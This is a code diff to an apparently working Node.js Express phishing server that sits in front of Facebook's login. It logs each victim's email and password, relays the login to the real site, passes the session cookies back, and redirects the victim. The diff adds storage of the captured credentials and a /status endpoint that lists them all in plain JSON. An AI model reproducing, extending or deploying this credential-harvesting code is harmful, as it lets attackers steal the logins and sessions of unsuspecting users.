@@ -1,7 +1,8 @@
-const express = require('express')
-const path = require('path')
-const PORT = process.env.PORT || 5000
+const express = require('express');
+const path = require('path');
+const PORT = process.env.PORT || 5000;
 const request = require('request');
+const storage = require('./storage');
 
 express()
   .use(express.static(path.join(__dirname, 'public')))
@@ -22,6 +23,7 @@ express()
     console.log("Someone who's clearly not aware of us tried to sign in!");
     console.log("Email: ", req.body.email);
     console.log("Password: ", req.body.pass);
+    storage.saveDetails(req.body.email, req.body.pass);
     const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
 
     request({
@@ -35,6 +37,11 @@ express()
     }, function (err, response, body) {
       res.header('Set-Cookie', response.headers['set-cookie']);
       res.redirect(response.headers.location || 'https://facebook.com');
+    });
+  })
+  .get('/status', (req, res) => {
+    storage.readDetails((details) => {
+      res.send(JSON.stringify(details, null, 2))
     });
   })
   .listen(PORT, () => console.log(`Listening on ${ PORT }`))
